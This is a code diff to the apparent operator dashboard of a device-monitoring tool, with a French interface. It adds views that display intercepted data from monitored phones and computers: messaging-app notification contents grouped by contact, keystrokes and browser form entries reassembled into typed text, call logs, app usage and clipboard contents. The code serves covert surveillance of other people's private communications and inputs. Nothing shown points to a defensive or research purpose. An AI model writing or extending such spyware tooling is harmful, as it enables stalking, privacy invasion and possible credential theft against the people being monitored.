@@ -370,27 +370,167 @@ async function loadAlerts(){
 }
 async function markAlertsSeen(){await fetch(`${API}/api/alerts/mark-seen`,{method:'POST',headers:authHeaders()});loadAlerts();document.getElementById('alert-badge').style.display='none';}
 
-// ─── MESSAGES ───
-const MESSAGE_TYPES=['notification_message','keystroke','clipboard','chrome_text','safari_text','chrome_form','safari_form'];
+// ─── MESSAGES INTELLIGENT ───
+
+function switchMsgTab(tab){
+  document.querySelectorAll('.msg-tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.msg-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelector(`.msg-tab[data-tab="${tab}"]`)?.classList.add('active');
+  document.getElementById(`msg-${tab}`)?.classList.add('active');
+}
+
 function renderMessagesPage(){
   const df=document.getElementById('messages-device-filter').value;
-  const tf=document.getElementById('messages-type-filter').value;
-  let msgs=allEvents.filter(e=>MESSAGE_TYPES.includes(e.type));
-  if(df)msgs=msgs.filter(e=>e.deviceId===df);
-  if(tf)msgs=msgs.filter(e=>e.type===tf);
-  const el=document.getElementById('messages-list');
-  if(!msgs.length){el.innerHTML='<p class="empty">Aucun message capturé.</p>';return;}
-  el.innerHTML=msgs.slice(0,300).map(e=>{
-    const lbl=TYPE_LABELS[e.type]||e.type;
-    const det=eventDetail(e);
-    return`<div class="event-row"><span class="event-badge ${esc(e.type)}">${esc(lbl)}</span>
-    <div class="event-content">${det?`<div class="event-detail">${det}</div>`:''}
-    <span class="event-device-tag">${esc(deviceName(e.deviceId))}</span></div>
-    <span class="event-time">${fmtTime(e.receivedAt)}</span></div>`;
+  let evts=[...allEvents];
+  if(df)evts=evts.filter(e=>e.deviceId===df);
+  renderConversations(evts);
+  renderTypedTexts(evts);
+  renderCallLog(evts);
+  renderAppUsage(evts);
+  renderClipboardLog(evts);
+}
+
+// --- Conversations groupees par contact/app ---
+function renderConversations(evts){
+  const msgs=evts.filter(e=>e.type==='notification_message');
+  const el=document.getElementById('conversations-list');
+  if(!msgs.length){el.innerHTML='<p class="empty">Aucune conversation captee. Les notifications WhatsApp/SMS apparaitront ici.</p>';return;}
+
+  const groups={};
+  msgs.forEach(m=>{
+    const p=m.payload||{};
+    const app=p.app||p.packageName||'App';
+    const sender=p.sender||'Inconnu';
+    const key=`${app}|||${sender}`;
+    if(!groups[key])groups[key]={app,sender,messages:[]};
+    groups[key].messages.push({text:p.message||p.text||'',time:m.receivedAt,device:m.deviceId});
+  });
+
+  const appIcons={WhatsApp:'💬','WhatsApp Business':'💼',Telegram:'✈️',Messenger:'💬',Instagram:'📸',Signal:'🔒',SMS:'📱',Messages:'📱','Samsung Messages':'📱',Slack:'💼',Teams:'💼',Discord:'🎮',Snapchat:'👻',Viber:'📞'};
+
+  el.innerHTML=Object.values(groups).sort((a,b)=>b.messages.length-a.messages.length).map(g=>{
+    const icon=appIcons[g.app]||'💬';
+    const msgsHtml=g.messages.slice(0,20).map(m=>`
+      <div class="conv-msg">
+        <div class="conv-msg-text">${esc(m.text)}</div>
+        <div class="conv-msg-time">${fmtTime(m.time)} — ${esc(deviceName(m.device))}</div>
+      </div>`).join('');
+    return`<div class="conv-group">
+      <div class="conv-header">
+        <span class="conv-app-icon">${icon}</span>
+        <span class="conv-app-name">${esc(g.app)}</span>
+        <span class="conv-contact">${esc(g.sender)}</span>
+        <span class="conv-count">${g.messages.length} msg</span>
+      </div>
+      ${msgsHtml}
+    </div>`;
   }).join('');
 }
+
+// --- Texte tape (reconstruit intelligemment) ---
+function renderTypedTexts(evts){
+  const keystrokes=evts.filter(e=>e.type==='keystroke'||e.type==='chrome_text'||e.type==='safari_text'||e.type==='chrome_form'||e.type==='safari_form');
+  const el=document.getElementById('typed-list');
+  if(!keystrokes.length){el.innerHTML='<p class="empty">Aucun texte capture. Le texte tape au clavier apparaitra ici.</p>';return;}
+
+  // Grouper par app et par fenetre de temps (5 min)
+  const blocks=[];
+  let current=null;
+  keystrokes.sort((a,b)=>new Date(a.receivedAt)-new Date(b.receivedAt)).forEach(e=>{
+    const p=e.payload||{};
+    const app=p.app||'App';
+    const text=p.text||Object.values(p.fields||{}).join(' ')||'';
+    if(!text)return;
+    const time=new Date(e.receivedAt).getTime();
+    if(current&&current.app===app&&time-current.lastTime<300000){
+      current.texts.push(text);
+      current.lastTime=time;
+      current.endTime=e.receivedAt;
+    }else{
+      current={app,texts:[text],startTime:e.receivedAt,endTime:e.receivedAt,lastTime:time,device:e.deviceId};
+      blocks.push(current);
+    }
+  });
+
+  el.innerHTML=blocks.reverse().slice(0,50).map(b=>{
+    const combinedText=b.texts[b.texts.length-1];
+    return`<div class="typed-block">
+      <div class="typed-app">📱 ${esc(b.app)} — ${esc(deviceName(b.device))}</div>
+      <div class="typed-text">${esc(combinedText)}</div>
+      <div class="typed-time">${fmtTime(b.startTime)}</div>
+    </div>`;
+  }).join('');
+}
+
+// --- Journal d'appels ---
+function renderCallLog(evts){
+  const calls=evts.filter(e=>e.type==='phone_call');
+  const el=document.getElementById('calls-list');
+  if(!calls.length){el.innerHTML='<p class="empty">Aucun appel enregistre. Le journal d\'appels apparaitra ici.</p>';return;}
+
+  const typeIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
+  const typeColors={entrant:'var(--success)',sortant:'var(--accent)',manque:'var(--danger)',rejete:'var(--warning)'};
+
+  el.innerHTML=calls.slice(0,50).map(e=>{
+    const p=e.payload||{};
+    const icon=typeIcons[p.type]||'📞';
+    const dur=p.durationMinutes>0?`${p.durationMinutes} min`:(p.durationSeconds>0?`${p.durationSeconds}s`:'—');
+    return`<div class="call-row">
+      <div class="call-icon">${icon}</div>
+      <div class="call-info">
+        <div class="call-number">${esc(p.number||'Inconnu')}</div>
+        ${p.contact?`<div class="call-contact">${esc(p.contact)}</div>`:''}
+      </div>
+      <div class="call-meta">
+        <div class="call-duration" style="color:${typeColors[p.type]||'var(--text)'}">${esc(p.type||'')} · ${dur}</div>
+        <div class="call-time">${fmtTime(e.receivedAt)}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// --- Applications utilisees ---
+function renderAppUsage(evts){
+  const focuses=evts.filter(e=>e.type==='app_focus');
+  const el=document.getElementById('apps-list');
+  if(!focuses.length){el.innerHTML='<p class="empty">Aucune app detectee.</p>';return;}
+
+  const appCounts={};
+  focuses.forEach(e=>{
+    const app=e.payload?.app||'';
+    if(!app||app.includes('systemui')||app.includes('launcher'))return;
+    if(!appCounts[app])appCounts[app]={count:0,last:e.receivedAt};
+    appCounts[app].count++;
+    if(e.receivedAt>appCounts[app].last)appCounts[app].last=e.receivedAt;
+  });
+
+  const sorted=Object.entries(appCounts).sort((a,b)=>b[1].count-a[1].count);
+  el.innerHTML=sorted.slice(0,30).map(([app,data])=>{
+    const shortName=app.split('.').pop();
+    return`<div class="app-row">
+      <span class="app-name">${esc(shortName)} <span style="color:var(--text-dim);font-weight:400;font-size:0.7rem">${esc(app)}</span></span>
+      <span style="font-weight:600">${data.count}x</span>
+      <span class="app-time-ago">${fmtTime(data.last)}</span>
+    </div>`;
+  }).join('');
+}
+
+// --- Presse-papiers ---
+function renderClipboardLog(evts){
+  const clips=evts.filter(e=>e.type==='clipboard');
+  const el=document.getElementById('clipboard-list');
+  if(!clips.length){el.innerHTML='<p class="empty">Aucun contenu copie.</p>';return;}
+
+  el.innerHTML=clips.slice(0,30).map(e=>{
+    const p=e.payload||{};
+    return`<div class="typed-block">
+      <div class="typed-text">${esc((p.text||'').slice(0,500))}</div>
+      <div class="typed-time">${p.length||0} caracteres — ${fmtTime(e.receivedAt)} — ${esc(deviceName(e.deviceId))}</div>
+    </div>`;
+  }).join('');
+}
+
 document.getElementById('messages-device-filter')?.addEventListener('change',renderMessagesPage);
-document.getElementById('messages-type-filter')?.addEventListener('change',renderMessagesPage);
 
 // ─── KEYWORDS ───
 async function loadKeywords(){
